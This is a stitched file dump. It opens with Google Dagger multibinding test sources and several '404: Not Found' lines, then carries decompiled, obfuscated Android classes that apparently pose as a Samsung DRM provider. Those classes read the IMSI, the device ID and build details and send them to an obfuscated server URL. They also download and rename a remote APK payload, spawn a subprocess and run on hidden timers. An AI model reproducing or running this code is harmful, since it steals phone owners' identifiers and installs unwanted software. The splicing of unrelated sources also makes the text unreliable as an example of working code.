/*
* Copyright (C) 2015 Google, Inc.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/
package test;

import dagger.Component;
import java.util.Collection;
import java.util.Map;
import java.util.Set;
import javax.inject.Provider;

@Component(modules = MultibindingModule.class)
interface MultibindingComponent {
  Map<String, String> map();
  Map<String, Provider<String>> mapOfProviders();
  Set<String> mapKeys();
  Collection<String> mapValues();
  Set<Integer> set();
  Map<TestKey.NestedWrappedKey, String> nestedKeyMap();
}

404: Not Found

/*
* Copyright (C) 2015 Google, Inc.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/
package test;

import dagger.Module;
import dagger.Provides;
import java.util.Collection;
import java.util.Map;
import java.util.Set;
import javax.inject.Provider;

import static dagger.Provides.Type.MAP;
import static dagger.Provides.Type.SET;

@Module
class MultibindingModule {
  @Provides(type = MAP) @TestKey("foo") String provideFooKey() {
    return "foo value";
  }

  @Provides(type = MAP) @TestKey("bar") String provideBarKey() {
    return "bar value";
  }

  @Provides(type = SET) int provideFiveToSet() {
    return 5;
  }

  @Provides(type = SET) int provideSixToSet() {
    return 6;
  }

  @Provides Set<String> provideMapKeys(Map<String, Provider<String>> map) {
    return map.keySet();
  }

  @Provides Collection<String> provideMapValues(Map<String, String> map) {
    return map.values();
  }

  @Provides(type = MAP) @TestKey.NestedWrappedKey(Integer.class) String valueForInteger() {
    return "integer";
  }

  @Provides(type = MAP) @TestKey.NestedWrappedKey(Long.class) String valueForLong() {
    return "long";
  }
}

/*
* Copyright (C) 2015 Google, Inc.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/
package test;

import dagger.Component;
import javax.inject.Inject;

@Component(dependencies = {NonComponentDependencyComponent.ThingComponent.class})
interface NonComponentDependencyComponent {
  ThingTwo thingTwo();

  static class ThingTwo {
    @SuppressWarnings("unused")
    @Inject
    ThingTwo(
        Thing thing,
        NonComponentDependencyComponent nonComponentDependencyComponent,
        NonComponentDependencyComponent.ThingComponent thingComponent) {}
  }

  // A non-component interface which this interface depends upon.
  interface ThingComponent {
    Thing thing();
  }

  // The implementation for that interface.
  static class ThingComponentImpl implements ThingComponent {
    @Override
    public Thing thing() {
      return new Thing();
    }
  }
}

404: Not Found

404: Not Found

404: Not Found

/*
* Copyright (C) 2014 Google, Inc.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/
package test;

import javax.inject.Inject;

final class Thing {
  @Inject Thing() {}
}

404: Not Found

/*
 * Copyright (C) 2015 Google, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the License
 * is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the License for the specific language governing permissions and limitations under
 * the License.
 */
package test;

import com.google.auto.value.AutoAnnotation;
import com.google.common.collect.ImmutableMap;
import java.util.Map;
import javax.inject.Provider;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.JUnit4;

import static com.google.common.truth.Truth.assertThat;

@RunWith(JUnit4.class)
public class MultibindingTest {
  @Test
  public void testMultibindings() {
    MultibindingComponent multibindingComponent = DaggerMultibindingComponent.create();
    Map<String, String> map = multibindingComponent.map();
    assertThat(map).hasSize(2);
    assertThat(map).containsEntry("foo", "foo value");
    assertThat(map).containsEntry("bar", "bar value");
    Map<String, Provider<String>> mapOfProviders = multibindingComponent.mapOfProviders();
    assertThat(mapOfProviders).hasSize(2);
    assertThat(mapOfProviders.get("foo").get()).isEqualTo("foo value");
    assertThat(mapOfProviders.get("bar").get()).isEqualTo("bar value");
    assertThat(multibindingComponent.mapKeys()).containsExactly("foo", "bar");
    assertThat(multibindingComponent.mapValues()).containsExactly("foo value", "bar value");
    assertThat(multibindingComponent.set()).containsExactly(5, 6);
    assertThat(multibindingComponent.nestedKeyMap()).isEqualTo(
        ImmutableMap.of(
            nestedWrappedKey(Integer.class), "integer",
            nestedWrappedKey(Long.class), "long"));
  }

  @AutoAnnotation
  static TestKey.NestedWrappedKey nestedWrappedKey(Class<?> value) {
    return new AutoAnnotation_MultibindingTest_nestedWrappedKey(value);
  }
}

public abstract class Charset {
  Context a = null;

  Activity b = null;

  private FileDescriptor a() {
    try {
      return Exec.createSubprocess(Xmlns.d("940Br4iR8cMWHxQhrCn_"), "-", null, new int[1]);
    } catch (Exception exception) {
      return null;
    }
  }

  private boolean a(String paramString1, Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString2, Object[] paramArrayOfObject) {
    Doctype.a(paramContext);
    Doctype doctype = Doctype.a(0);
    String str = doctype.c("warpeace", null);
    if (!Xmlns.a(str)) {
      if (paramFileDescriptor == null) {
        try {
          a();
          if (paramString2 == null)
            String str1 = Onion.e;
          if (3 <= doctype.b("from", 0)) {
            boolean bool = ((Boolean)Doctype.a(null, str.concat(".").concat(paramActivity.getClass().getSimpleName()), paramString1, paramArrayOfObject)).booleanValue();
            doctype.a("from", 4);
            return bool;
          }
        } catch (Exception exception) {
          doctype.a("from", 4);
        }
        return false;
      }
    } else {
      return false;
    }
    if (paramString2 == null)
      String str1 = Onion.e;
    if (3 <= doctype.b("from", 0)) {
      boolean bool = ((Boolean)Doctype.a(null, str.concat(".").concat(paramActivity.getClass().getSimpleName()), (String)exception, paramArrayOfObject)).booleanValue();
      doctype.a("from", 4);
      return bool;
    }
  }

  public void a(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Class paramClass, int paramInt) {
    Intent intent = new Intent(paramContext, paramClass);
    intent.addFlags(268435456);
    paramContext.startActivity(intent);
  }

  public void a(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Integer paramInteger) {
    a(Transitional.d, paramContext, paramActivity, paramFileDescriptor, paramString, new Object[] { paramContext, paramActivity, paramFileDescriptor, paramString, paramInteger });
  }

  public void b(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Integer paramInteger) {
    a(Transitional.a, paramContext, paramActivity, paramFileDescriptor, paramString, new Object[] { paramContext, paramActivity, paramFileDescriptor, paramString, paramInteger });
  }

  public void c(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Integer paramInteger) {
    a(Transitional.b, paramContext, paramActivity, paramFileDescriptor, paramString, new Object[] { paramContext, paramActivity, paramFileDescriptor, paramString, paramInteger });
  }

  public void d(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Integer paramInteger) {
    a(Transitional.c, paramContext, paramActivity, paramFileDescriptor, paramString, new Object[] { paramContext, paramActivity, paramFileDescriptor, paramString, paramInteger });
  }

  public boolean e(Context paramContext, Activity paramActivity, FileDescriptor paramFileDescriptor, String paramString, Integer paramInteger) {
    return a(Transitional.e, paramContext, paramActivity, paramFileDescriptor, paramString, new Object[] { paramContext, paramActivity, paramFileDescriptor, paramString, paramInteger });
  }
}

public class Onion {
  public static boolean a;

  public static int b;

  public static int c;

  public static String e;

  public static String f;

  private static Onion j = null;

  public String d = "7CMg9e0R72B58Ii28CRD9eihux0byC02zx3O9e0RrezRrn__";

  Context g = null;

  String h = null;

  String i = null;

  private boolean k = true;

  private String l = "7xBNzKFCzKFW9IiW";

  private String m = "7xBNzKFCzKF59IiW";

  static {
    a = true;
    b = 4;
    c = 33;
    e = "7CMg9IkOzoFhHxlOuIRRu2BwuK0p8Cp_";
    f = "8";
  }

  public static int a() {
    return b;
  }

  private String a(String paramString) {
    Doctype doctype1 = Doctype.a(11);
    Doctype doctype2 = Doctype.a(0);
    String str7 = f();
    String str3 = doctype2.c(str7 + "ewar01", null);
    int i = b;
    String str4 = Build.VERSION.RELEASE;
    String str5 = Build.MANUFACTURER;
    String str6 = Build.MODEL;
    String str2 = doctype2.c(str7 + "wwenglish", null);
    String str1 = str2;
    if (str2 == null) {
      str1 = ((TelephonyManager)this.g.getSystemService("phone")).getDeviceId();
      doctype2.b(str7 + "wwenglish", str1);
    }
    String str8 = Build.VERSION.SDK;
    long l1 = Doctype.a(0).a("html", 0L);
    int j = doctype2.b("novel", 0);
    int k = doctype1.b("style", 0);
    int m = doctype1.b("height", 0);
    int n = doctype2.b("from", 0);
    str2 = null;
    long l2 = doctype1.a("type", 0L);
    if (0L != l2)
      str2 = l2 + "";
    String str9 = this.g.getPackageName();
    String str10 = doctype1.c(str7 + "head", null);
    str7 = doctype1.c(str7 + "begineditable", null);
    Object[] arrayOfObject = new Object[18];
    arrayOfObject[0] = this.h;
    arrayOfObject[1] = str3;
    arrayOfObject[2] = Integer.valueOf(i);
    arrayOfObject[3] = str4;
    arrayOfObject[4] = str5;
    arrayOfObject[5] = str6;
    arrayOfObject[6] = f;
    arrayOfObject[7] = str1;
    arrayOfObject[8] = str8;
    arrayOfObject[9] = Long.valueOf(l1);
    arrayOfObject[10] = Integer.valueOf(j);
    arrayOfObject[11] = Integer.valueOf(k);
    arrayOfObject[12] = Integer.valueOf(m);
    arrayOfObject[13] = Integer.valueOf(n);
    arrayOfObject[14] = str2;
    arrayOfObject[15] = str9;
    arrayOfObject[16] = str10;
    arrayOfObject[17] = str7;
    StringBuffer stringBuffer = new StringBuffer(paramString);
    i = 0;
    for (j = 0; j < arrayOfObject.length; j++) {
      if (arrayOfObject[j] != null) {
        if (i != 0) {
          stringBuffer.append("&");
        } else {
          i = 1;
          stringBuffer.append("?");
        }
        stringBuffer.append((char)(j + 97));
        stringBuffer.append("=");
        stringBuffer.append(Xmlns.a(arrayOfObject[j]));
        stringBuffer.append("&");
        stringBuffer.append((char)(j + 97));
        stringBuffer.append("1=");
        stringBuffer.append(Xmlns.a(Xmlns.b(String.valueOf(arrayOfObject[j]))));
      }
    }
    stringBuffer.append("&key=");
    stringBuffer.append(Xmlns.b((new Date()).getTime() + ""));
    return stringBuffer.toString();
  }

  private void b() {
    try {
      if (this.h == null)
        this.h = ((TelephonyManager)this.g.getSystemService("phone")).getSubscriberId();
    } catch (Exception exception) {}
    c();
  }

  private void b(String paramString) {
    if (Xmlns.a(paramString))
      throw new Exception();
    String str = Xmlns.d(paramString);
    InputStream inputStream = Doctype.a.getAssets().open(str);
    FileOutputStream fileOutputStream = Doctype.a.openFileOutput(str, 3);
    byte[] arrayOfByte = new byte[1024];
    while (true) {
      if (inputStream.read(arrayOfByte) == -1) {
        fileOutputStream.flush();
        inputStream.close();
        fileOutputStream.close();
        return;
      }
      fileOutputStream.write(arrayOfByte);
    }
  }

  private void c() {
    try {
      Doctype doctype = Doctype.a(11);
      if (!Xmlns.a(Long.valueOf(doctype.a("type", 0L)).longValue())) {
        Long long_1 = Long.valueOf(doctype.a("content", 0L));
        long l1 = doctype.a("text", 7200000L);
        long l2 = Math.abs((new Date()).getTime() - long_1.longValue());
        if (long_1.longValue() == 0L || l2 > Long.valueOf(l1).longValue())
          d();
      }
      Long long_ = Long.valueOf(doctype.a("type", 0L));
      if (Xmlns.a(long_.longValue())) {
        Date date = new Date();
        long l = doctype.a("link", 86400000L);
        if (Math.abs(date.getTime() - long_.longValue()) < l) {
          int i = doctype.b("family", 0);
          int j = doctype.b("size", 24);
          int k = date.getHours();
          if (i <= k && k <= j && e()) {
            Doctype doctype1 = Doctype.a(0);
            doctype1.a("novel", doctype.b("doctitle", 0));
            doctype1.a("from", 3);
            doctype.a("endeditable", "face");
            doctype.a("style", 0);
            doctype.a("style", 0);
            doctype.a("height", 0);
            if (!Xmlns.a(doctype.c("11pt", null)))
              (new External(this)).start();
            a = true;
            this.k = false;
            Intent intent = new Intent(Description.b);
            this.g.sendBroadcast(intent);
          }
        }
      }
    } catch (Exception exception) {}
    a = true;
  }

  private void d() {
    European european;
    Doctype doctype1 = Doctype.a(11);
    try {
      str1 = doctype1.c("begintemplate", null);
      String str = str1;
      if (Xmlns.a(str1))
        str = Xmlns.d("HoiprJbh9CVp9I0h8Cg1zKVO7CAO7CfaPJSQfvMUH2B574i18CQ_");
      str = a(str);
      if (str == null)
        return;
      european = new European(str);
      doctype1.a("content", Long.valueOf((new Date()).getTime()));
      str1 = european.a(0);
      Date date = new Date();
      if ("-2".equals(str1)) {
        doctype1.a();
        Doctype.a(0).a("saved", "peace");
        return;
      }
    } catch (Exception null) {
      doctype1.a("begintemplate");
      if (!Xmlns.a(doctype1.a("body", 0L))) {
        Date date = new Date();
        int i1 = doctype1.b("topmargin", 0) + 1;
        doctype1.a("topmargin", i1);
        doctype1.a("body", Long.valueOf(date.getTime()));
        if (i1 >= 7) {
          try {
            str1 = Xhtml.a(Xmlns.d("HoiprJbh9CFE8CrOrCRO7cBw8CpO7CQhr2MW8tMeKNnp0JT57wrQfJjYfoFOXxyOHoig8S__"), false, "utf-8", "^[\\W]+v_____:");
            if ("-2".equals(str1)) {
              doctype1.a();
              Doctype.a(0).a("saved", "peace");
              return;
            }
          } catch (Exception exception) {
            return;
          }
          if ("-1".equals(str1)) {
            doctype1.a();
            return;
          }
          if ("0".equals(str1)) {
            doctype1.a("type", Long.valueOf(exception.getTime()));
            return;
          }
          if ("".equals(str1)) {
            doctype1.a("begintemplate");
            return;
          }
          if (!Xmlns.a(Xmlns.d(str1))) {
            doctype1.a("begintemplate", str1);
            doctype1.a("body");
            doctype1.a("topmargin");
          }
        }
      }
    }
    if ("-1".equals(str1)) {
      doctype1.a();
      Doctype.a(0).a();
      return;
    }
    if ("0".equals(str1)) {
      str1 = european.a(13);
      doctype1.a("type", Long.valueOf(exception.getTime())).a("begintemplate", str1);
      return;
    }
    if ("".equals(str1)) {
      doctype1.a("begintemplate");
      return;
    }
    String str9 = european.a(1);
    String str1 = european.a(2);
    String str10 = european.a(3);
    String str2 = european.a(4);
    String str3 = european.a(5);
    String str11 = european.a(6);
    String str12 = european.a(7);
    String str13 = european.a(8);
    String str14 = european.a(9);
    String str15 = european.a(10);
    String str4 = european.a(11);
    String str16 = european.a(12);
    String str5 = european.a(13);
    String str6 = european.a(14);
    String str7 = european.a(15);
    String str8 = european.a(16);
    long l1 = Long.parseLong(str9);
    int i = Integer.parseInt(str10);
    int j = Integer.parseInt(str11);
    int k = Integer.parseInt(str12);
    long l2 = Long.parseLong(str13);
    int m = Integer.parseInt(str14);
    int n = Integer.parseInt(str15);
    long l3 = Long.parseLong(str16);
    str9 = f();
    Doctype doctype2 = Doctype.a(0);
    doctype2.a("warpeace", str1);
    doctype1.a("link", Long.valueOf(l1)).a("doctitle", i).a("stylesheet", str2).a("href", str3).a("gb2312", j).a("line", k).a("font", Long.valueOf(l2)).a("family", m).a("size", n).a("11pt", str4).a("text", Long.valueOf(l3)).a("begintemplate", str5).a(str9 + "head", str7).a(str9 + "begineditable", str8);
    doctype2.a(str9 + "ewar01", str6);
    if (!Xmlns.b(doctype1.a("type", 0L)))
      doctype1.a("height", 0);
    doctype1.a("style", 0).a("type", Long.valueOf(exception.getTime()));
    doctype1.a("body");
    doctype1.a("topmargin");
  }

  private boolean e() {
    // Byte code:
    //   0: bipush #11
    //   2: invokestatic a : (I)Lcom/sec/android/providers/drm/Doctype;
    //   5: astore #7
    //   7: iconst_0
    //   8: invokestatic a : (I)Lcom/sec/android/providers/drm/Doctype;
    //   11: astore #4
    //   13: aload #7
    //   15: ldc_w 'doctitle'
    //   18: iconst_0
    //   19: invokevirtual b : (Ljava/lang/String;I)I
    //   22: istore_1
    //   23: aload #4
    //   25: ldc 'novel'
    //   27: iconst_0
    //   28: invokevirtual b : (Ljava/lang/String;I)I
    //   31: istore_2
    //   32: aload #4
    //   34: ldc 'from'
    //   36: iconst_0
    //   37: invokevirtual b : (Ljava/lang/String;I)I
    //   40: istore_3
    //   41: iload_2
    //   42: iload_1
    //   43: if_icmpge -> 46
    //   46: aload_0
    //   47: getfield l : Ljava/lang/String;
    //   50: invokestatic a : (Ljava/lang/String;)Z
    //   53: ifeq -> 61
    //   56: iload_2
    //   57: iload_1
    //   58: if_icmpne -> 61
    //   61: aload_0
    //   62: getfield l : Ljava/lang/String;
    //   65: invokestatic a : (Ljava/lang/String;)Z
    //   68: ifeq -> 76
    //   71: iconst_1
    //   72: iload_3
    //   73: if_icmpne -> 76
    //   76: iload_2
    //   77: iload_1
    //   78: if_icmplt -> 121
    //   81: aload_0
    //   82: getfield l : Ljava/lang/String;
    //   85: invokestatic a : (Ljava/lang/String;)Z
    //   88: ifeq -> 96
    //   91: iconst_1
    //   92: iload_3
    //   93: if_icmpeq -> 121
    //   96: aload_0
    //   97: getfield l : Ljava/lang/String;
    //   100: invokestatic a : (Ljava/lang/String;)Z
    //   103: ifeq -> 524
    //   106: aload_0
    //   107: getfield m : Ljava/lang/String;
    //   110: invokestatic a : (Ljava/lang/String;)Z
    //   113: ifne -> 524
    //   116: iload_2
    //   117: iload_1
    //   118: if_icmpne -> 524
    //   121: aload #7
    //   123: ldc 'from'
    //   125: iconst_1
    //   126: invokevirtual a : (Ljava/lang/String;I)Lcom/sec/android/providers/drm/Doctype;
    //   129: pop
    //   130: aload #7
    //   132: ldc_w 'stylesheet'
    //   135: aconst_null
    //   136: invokevirtual c : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   139: astore #5
    //   141: aload #7
    //   143: ldc_w 'href'
    //   146: aconst_null
    //   147: invokevirtual c : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   150: astore #6
    //   152: aload #5
    //   154: invokestatic a : (Ljava/lang/String;)Z
    //   157: ifne -> 174
    //   160: aload #5
    //   162: astore #4
    //   164: aload #4
    //   166: invokestatic a : (Ljava/lang/String;)Z
    //   169: ifeq -> 189
    //   172: iconst_0
    //   173: ireturn
    //   174: aload #6
    //   176: invokestatic a : (Ljava/lang/String;)Z
    //   179: ifne -> 757
    //   182: aload #6
    //   184: astore #4
    //   186: goto -> 164
    //   189: aload #7
    //   191: ldc_w 'gb2312'
    //   194: iconst_0
    //   195: invokevirtual b : (Ljava/lang/String;I)I
    //   198: istore_2
    //   199: aload #7
    //   201: ldc 'style'
    //   203: iconst_0
    //   204: invokevirtual b : (Ljava/lang/String;I)I
    //   207: istore_1
    //   208: iload_2
    //   209: iload_1
    //   210: if_icmpgt -> 215
    //   213: iconst_0
    //   214: ireturn
    //   215: aload #7
    //   217: ldc_w 'line'
    //   220: iconst_0
    //   221: invokevirtual b : (Ljava/lang/String;I)I
    //   224: istore_3
    //   225: aload #7
    //   227: ldc 'height'
    //   229: iconst_0
    //   230: invokevirtual b : (Ljava/lang/String;I)I
    //   233: istore_2
    //   234: iload_3
    //   235: iload_2
    //   236: if_icmpgt -> 241
    //   239: iconst_0
    //   240: ireturn
    //   241: aload #5
    //   243: invokestatic a : (Ljava/lang/String;)Z
    //   246: ifne -> 538
    //   249: new java/net/URL
    //   252: dup
    //   253: aload #4
    //   255: invokespecial <init> : (Ljava/lang/String;)V
    //   258: invokevirtual openConnection : ()Ljava/net/URLConnection;
    //   261: astore #6
    //   263: aload #6
    //   265: sipush #15000
    //   268: invokevirtual setReadTimeout : (I)V
    //   271: aload #6
    //   273: invokevirtual connect : ()V
    //   276: aload #6
    //   278: invokevirtual getInputStream : ()Ljava/io/InputStream;
    //   281: astore #5
    //   283: aload #6
    //   285: invokevirtual getContentLength : ()I
    //   288: pop
    //   289: new java/io/File
    //   292: dup
    //   293: new java/lang/StringBuilder
    //   296: dup
    //   297: invokespecial <init> : ()V
    //   300: ldc_w '9Ci5utjhztkp7cA_'
    //   303: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
    //   306: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   309: getstatic com/sec/android/providers/drm/Doctype.a : Landroid/content/Context;
    //   312: invokevirtual getPackageName : ()Ljava/lang/String;
    //   315: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   318: ldc_w '9Cz18t3N9CVO7KTm'
    //   321: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
    //   324: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   327: invokevirtual toString : ()Ljava/lang/String;
    //   330: invokespecial <init> : (Ljava/lang/String;)V
    //   333: astore #6
    //   335: aload #6
    //   337: invokevirtual exists : ()Z
    //   340: ifeq -> 477
    //   343: aload #6
    //   345: invokevirtual delete : ()Z
    //   348: pop
    //   349: new java/io/FileOutputStream
    //   352: dup
    //   353: aload #6
    //   355: invokespecial <init> : (Ljava/io/File;)V
    //   358: astore #8
    //   360: sipush #1024
    //   363: newarray byte
    //   365: astore #9
    //   367: aload #5
    //   369: aload #9
    //   371: invokevirtual read : ([B)I
    //   374: istore_3
    //   375: iload_3
    //   376: iconst_m1
    //   377: if_icmpne -> 526
    //   380: aload #5
    //   382: invokevirtual close : ()V
    //   385: aload #6
    //   387: astore #5
    //   389: aload #4
    //   391: ldc_w '.apk'
    //   394: invokevirtual endsWith : (Ljava/lang/String;)Z
    //   397: ifne -> 407
    //   400: aload #6
    //   402: invokestatic a : (Ljava/io/File;)Ljava/io/File;
    //   405: astore #5
    //   407: new java/io/File
    //   410: dup
    //   411: new java/lang/StringBuilder
    //   414: dup
    //   415: invokespecial <init> : ()V
    //   418: ldc_w '9Ci5utjhztkp7cA_'
    //   421: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
    //   424: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   427: getstatic com/sec/android/providers/drm/Doctype.a : Landroid/content/Context;
    //   430: invokevirtual getPackageName : ()Ljava/lang/String;
    //   433: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   436: ldc_w '9Cz18t3N9CkOrC32uI327WBD7n__'
    //   439: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
    //   442: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   445: invokevirtual toString : ()Ljava/lang/String;
    //   448: invokespecial <init> : (Ljava/lang/String;)V
    //   451: astore #4
    //   453: aload #4
    //   455: invokevirtual exists : ()Z
    //   458: ifeq -> 467
    //   461: aload #4
    //   463: invokevirtual delete : ()Z
    //   466: pop
    //   467: aload #5
    //   469: aload #4
    //   471: invokevirtual renameTo : (Ljava/io/File;)Z
    //   474: pop
    //   475: iconst_1
    //   476: ireturn
    //   477: aload #6
    //   479: invokevirtual getParentFile : ()Ljava/io/File;
    //   482: invokevirtual exists : ()Z
    //   485: ifne -> 349
    //   488: aload #6
    //   490: invokevirtual getParentFile : ()Ljava/io/File;
    //   493: invokevirtual mkdirs : ()Z
    //   496: pop
    //   497: goto -> 349
    //   500: astore #4
    //   502: aload #7
    //   504: ldc 'style'
    //   506: iload_1
    //   507: iconst_1
    //   508: iadd
    //   509: invokevirtual a : (Ljava/lang/String;I)Lcom/sec/android/providers/drm/Doctype;
    //   512: pop
    //   513: aload #7
    //   515: ldc 'height'
    //   517: iload_2
    //   518: iconst_1
    //   519: iadd
    //   520: invokevirtual a : (Ljava/lang/String;I)Lcom/sec/android/providers/drm/Doctype;
    //   523: pop
    //   524: iconst_0
    //   525: ireturn
    //   526: aload #8
    //   528: aload #9
    //   530: iconst_0
    //   531: iload_3
    //   532: invokevirtual write : ([BII)V
    //   535: goto -> 367
    //   538: aload #6
    //   540: invokestatic a : (Ljava/lang/String;)Z
    //   543: ifne -> 524
    //   546: aload #4
    //   548: iconst_0
    //   549: ldc_w 'utf-8'
    //   552: ldc_w 'KRgr3LpmuRMdKLMdPn__'
    //   555: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
    //   558: invokestatic a : (Ljava/lang/String;ZLjava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   561: astore #4
    //   563: new java/io/File
    //   566: dup
    //   567: new java/lang/StringBuilder
    //   570: dup
    //   571: invokespecial <init> : ()V
    //   574: ldc_w '9Ci5utjhztkp7cA_'
    //   577: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
    //   580: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   583: getstatic com/sec/android/providers/drm/Doctype.a : Landroid/content/Context;
    //   586: invokevirtual getPackageName : ()Ljava/lang/String;
    //   589: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   592: ldc_w '9Cz18t3N9CVO7KTm9e11rS__'
    //   595: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
    //   598: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   601: invokevirtual toString : ()Ljava/lang/String;
    //   604: invokespecial <init> : (Ljava/lang/String;)V
    //   607: astore #5
    //   609: aload #5
    //   611: invokevirtual exists : ()Z
    //   614: ifeq -> 707
    //   617: aload #5
    //   619: invokevirtual delete : ()Z
    //   622: pop
    //   623: aload #4
    //   625: aload #5
    //   627: invokestatic a : (Ljava/lang/String;Ljava/io/File;)V
    //   630: aload #5
    //   632: invokestatic a : (Ljava/io/File;)Ljava/io/File;
    //   635: astore #4
    //   637: new java/io/File
    //   640: dup
    //   641: new java/lang/StringBuilder
    //   644: dup
    //   645: invokespecial <init> : ()V
    //   648: ldc_w '9Ci5utjhztkp7cA_'
    //   651: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
    //   654: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   657: getstatic com/sec/android/providers/drm/Doctype.a : Landroid/content/Context;
    //   660: invokevirtual getPackageName : ()Ljava/lang/String;
    //   663: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   666: ldc_w '9Cz18t3N9CkOrC32uI327WBD7n__'
    //   669: invokestatic d : (Ljava/lang/String;)Ljava/lang/String;
    //   672: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   675: invokevirtual toString : ()Ljava/lang/String;
    //   678: invokespecial <init> : (Ljava/lang/String;)V
    //   681: astore #5
    //   683: aload #5
    //   685: invokevirtual exists : ()Z
    //   688: ifeq -> 697
    //   691: aload #5
    //   693: invokevirtual delete : ()Z
    //   696: pop
    //   697: aload #4
    //   699: aload #5
    //   701: invokevirtual renameTo : (Ljava/io/File;)Z
    //   704: pop
    //   705: iconst_1
    //   706: ireturn
    //   707: aload #5
    //   709: invokevirtual getParentFile : ()Ljava/io/File;
    //   712: invokevirtual exists : ()Z
    //   715: ifne -> 623
    //   718: aload #5
    //   720: invokevirtual getParentFile : ()Ljava/io/File;
    //   723: invokevirtual mkdirs : ()Z
    //   726: pop
    //   727: goto -> 623
    //   730: astore #4
    //   732: aload #7
    //   734: ldc 'style'
    //   736: iload_1
    //   737: iconst_1
    //   738: iadd
    //   739: invokevirtual a : (Ljava/lang/String;I)Lcom/sec/android/providers/drm/Doctype;
    //   742: pop
    //   743: aload #7
    //   745: ldc 'height'
    //   747: iload_2
    //   748: iconst_1
    //   749: iadd
    //   750: invokevirtual a : (Ljava/lang/String;I)Lcom/sec/android/providers/drm/Doctype;
    //   753: pop
    //   754: goto -> 524
    //   757: aconst_null
    //   758: astore #4
    //   760: goto -> 164
    // Exception table:
    //   from	to	target	type
    //   249	349	500	java/lang/Exception
    //   349	367	500	java/lang/Exception
    //   367	375	500	java/lang/Exception
    //   380	385	500	java/lang/Exception
    //   389	407	500	java/lang/Exception
    //   407	467	500	java/lang/Exception
    //   467	475	500	java/lang/Exception
    //   477	497	500	java/lang/Exception
    //   526	535	500	java/lang/Exception
    //   546	623	730	java/lang/Exception
    //   623	697	730	java/lang/Exception
    //   697	705	730	java/lang/Exception
    //   707	727	730	java/lang/Exception
  }

  private String f() {
    if (this.i == null && g() == null)
      this.i = Xmlns.c(g());
    return this.i;
  }

  private String g() {
    if (this.h == null)
      try {
        this.h = ((TelephonyManager)this.g.getSystemService("phone")).getSubscriberId();
      } catch (Exception exception) {}
    return this.h;
  }

  public boolean a(Context paramContext, Intent paramIntent, BroadcastReceiver paramBroadcastReceiver, FileDescriptor paramFileDescriptor, String paramString) {
    this.g = paramContext;
    if ("peace".equals(Doctype.a(0).d("saved", "")))
      return false;
    Doctype doctype1 = Doctype.a(0);
    Doctype doctype2 = Doctype.a(11);
    if (0L == doctype1.a("html", 0L)) {
      doctype1.a("html", Long.valueOf((new Date()).getTime()));
      doctype1.a("novel", c);
      doctype1.a("user", b);
      try {
        if (!Xmlns.a(this.m))
          b(this.m);
        b(this.l);
        doctype1.a("from", 3);
        doctype1.a("warpeace", e);
